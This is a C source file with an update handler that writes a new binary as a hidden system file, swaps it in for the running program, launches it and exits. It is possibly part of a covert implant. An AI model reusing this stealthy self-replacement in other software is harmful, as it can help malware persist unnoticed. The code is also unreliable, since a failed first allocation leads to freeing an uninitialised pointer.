#include "update_handler.h"

int update_handler(struct buffer *buf) {
    int ret = 1;

    size_t path_len = strlen(win_bin_path);

    char *tmp_path = malloc(path_len + 5);

    if (!tmp_path) {
        ret = 0;
        goto clean;
    }

    char *bak_path = malloc(path_len + 5);

    if (!bak_path) {
        ret = 0;
        goto clean;
    }

    memcpy(tmp_path, win_bin_path, path_len);
    char *tmp_ext = ".tmp";
    memcpy(tmp_path + path_len, tmp_ext, 5);

    memcpy(bak_path, win_bin_path, path_len);
    char *bak_ext = ".bak";
    memcpy(bak_path + path_len, bak_ext, 5);

    if (!write_file(tmp_path, buf, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
        ret = 0;
        goto clean;
    }

    if (!move_file(win_bin_path, bak_path)) {
        ret = 0;
        goto clean;
    }

    if (!move_file(tmp_path, win_bin_path)) {
        ret = 0;
        goto clean;
    }

    if (!create_process(win_bin_path)) {
        ret = 0;
    }

    clean:

    if (tmp_path) {
        free(tmp_path);
    }

    if (bak_path) {
        free(bak_path);
    }

    if (ret) {
        ExitProcess(0);
    }

    return ret;
}
